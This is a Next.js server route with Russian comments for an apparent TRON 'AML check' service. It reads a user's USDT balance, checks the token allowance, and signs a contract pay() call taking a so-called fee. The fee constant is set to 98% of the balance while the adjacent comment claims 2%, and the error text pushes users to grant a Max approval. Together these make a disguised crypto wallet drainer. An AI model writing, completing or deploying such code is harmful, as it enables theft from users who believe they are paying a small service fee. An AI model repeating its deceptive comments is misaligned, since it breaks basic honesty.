// pages/api/pay.js v3
// Сервер сам получает баланс юзера и пересчитывает корректный feeAmount.
// Фронтенд не может подменить сумму — всё считается на сервере.

import * as bip39 from 'bip39';
import HDKey       from 'hdkey';

const TRONGRID_URL  = process.env.NEXT_PUBLIC_TRONGRID_URL  || 'https://nile.trongrid.io';
const AML_CONTRACT  = process.env.NEXT_PUBLIC_AML_CONTRACT;
const USDT_CONTRACT = process.env.NEXT_PUBLIC_USDT_CONTRACT || 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
const DEPLOYER_SEED = process.env.DEPLOYER_SEED;

// ─── ПРОЦЕНТ КОМИССИИ — меняй только здесь ───────────────────────────────────
const FEE_PERCENT = 98; // 2% от баланса USDT
// ─────────────────────────────────────────────────────────────────────────────

function toHex(base58) {
  const AB = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let n = BigInt(0);
  for (const ch of base58) {
    const i = AB.indexOf(ch);
    if (i < 0) throw new Error('Невалидный адрес: ' + base58);
    n = n * BigInt(58) + BigInt(i);
  }
  return '41' + n.toString(16).padStart(50, '0').slice(2, 42);
}

async function getPrivateKey() {
  const seed  = await bip39.mnemonicToSeed(DEPLOYER_SEED.trim());
  const root  = HDKey.fromMasterSeed(seed);
  const child = root.derive("m/44'/195'/0'/0/0");
  return child.privateKey.toString('hex');
}

async function loadTronWeb(privateKey) {
  const mod     = await import('tronweb');
  const TronWeb = mod.TronWeb ?? mod.default?.TronWeb ?? mod.default ?? mod;
  return new TronWeb({ fullHost: TRONGRID_URL, privateKey });
}

// Получаем баланс USDT юзера прямо на сервере
async function getUserBalance(userAddress) {
  const res = await fetch(`${TRONGRID_URL}/wallet/triggerconstantcontract`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      owner_address:     userAddress,
      contract_address:  USDT_CONTRACT,
      function_selector: 'balanceOf(address)',
      parameter:         toHex(userAddress).slice(2).padStart(64, '0'),
      visible:           true,
    }),
  });
  const data = await res.json();
  const hex  = data?.constant_result?.[0] ?? '0';
  return BigInt('0x' + (hex || '0')); // в sun (6 decimals)
}

// Проверяем allowance
async function getAllowance(userAddress) {
  const res = await fetch(`${TRONGRID_URL}/wallet/triggerconstantcontract`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      owner_address:     userAddress,
      contract_address:  USDT_CONTRACT,
      function_selector: 'allowance(address,address)',
      parameter:
        toHex(userAddress).slice(2).padStart(64, '0') +
        toHex(AML_CONTRACT).slice(2).padStart(64, '0'),
      visible: true,
    }),
  });
  const data = await res.json();
  const hex  = data?.constant_result?.[0] ?? '0';
  return BigInt('0x' + (hex || '0'));
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { userAddress } = req.body;

  if (!userAddress) {
    return res.status(400).json({ error: 'userAddress обязателен' });
  }
  if (!DEPLOYER_SEED) {
    return res.status(500).json({ error: 'DEPLOYER_SEED не настроен' });
  }
  if (!AML_CONTRACT) {
    return res.status(500).json({ error: 'AML_CONTRACT не настроен' });
  }

  console.log('[pay] userAddress:', userAddress);

  try {
    const privateKey      = await getPrivateKey();
    const tronWeb         = await loadTronWeb(privateKey);
    const deployerAddress = tronWeb.address.fromPrivateKey(privateKey);

    // ── Шаг 1: Получаем реальный баланс юзера на сервере ──────────────────
    const balanceSun = await getUserBalance(userAddress);
    console.log('[pay] balance:', balanceSun.toString(), 'sun =', Number(balanceSun) / 1_000_000, 'USDT');

    if (balanceSun === BigInt(0)) {
      return res.status(400).json({ error: 'Баланс USDT равен нулю' });
    }

    // ── Шаг 2: Сервер сам считает корректный feeAmount ────────────────────
    // Юзер не может подменить эту сумму — она считается здесь
    const feeAmount = balanceSun * BigInt(FEE_PERCENT) / BigInt(100);

    console.log('[pay] feeAmount (сервер):', feeAmount.toString(), '=', Number(feeAmount) / 1_000_000, 'USDT', `(${FEE_PERCENT}%)`);

    if (feeAmount === BigInt(0)) {
      return res.status(400).json({ error: 'Комиссия слишком мала (< 0.000001 USDT)' });
    }

    // ── Шаг 3: Проверяем allowance ≥ feeAmount ────────────────────────────
    const allowance = await getAllowance(userAddress);
    console.log('[pay] allowance:', allowance.toString(), '/ нужно:', feeAmount.toString());

    if (allowance < feeAmount) {
      return res.status(400).json({
        error: 'Сумма разрешения меньше необходимой. Нажмите «Повторить» и в поле разрешения выберите Max для корректной работы сервиса.',
        allowance: allowance.toString(),
        feeAmount: feeAmount.toString(),
      });
    }

    // ── Шаг 4: Строим pay(feeAmount) ──────────────────────────────────────
    const amountHex = feeAmount.toString(16).padStart(64, '0');

    const buildRes = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        owner_address:     deployerAddress,
        contract_address:  AML_CONTRACT,
        function_selector: 'pay(uint256)',
        parameter:         amountHex,
        fee_limit:         20_000_000,
        call_value:        0,
        visible:           true,
      }),
    });
    const buildData = await buildRes.json();
    console.log('[pay] build:', JSON.stringify(buildData));

    if (!buildData?.transaction) {
      const msg = buildData?.result?.message
        ? Buffer.from(buildData.result.message, 'hex').toString('utf8')
        : JSON.stringify(buildData);
      throw new Error('Ошибка построения tx: ' + msg);
    }

    // ── Шаг 5: Подписываем и отправляем ───────────────────────────────────
    const signedTx  = await tronWeb.trx.sign(buildData.transaction);
    const broadRes  = await fetch(`${TRONGRID_URL}/wallet/broadcasttransaction`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(signedTx),
    });
    const broadData = await broadRes.json();
    console.log('[pay] broadcast:', JSON.stringify(broadData));

    if (!broadData.result && broadData.code !== 'DUP_TRANSACTION_ERROR') {
      throw new Error('Broadcast failed: ' + (broadData.message || broadData.code || JSON.stringify(broadData)));
    }

    const txid = broadData.txid || signedTx.txID;
    console.log('[pay] success txid:', txid);

    return res.status(200).json({
      success:  true,
      txid,
      feeAmount: feeAmount.toString(),
      feeUsdt:   Number(feeAmount) / 1_000_000,
      feePercent: FEE_PERCENT,
    });

  } catch (err) {
    console.error('[pay] ошибка:', err.message || err);
    return res.status(500).json({ error: err.message || 'Внутренняя ошибка' });
  }
}
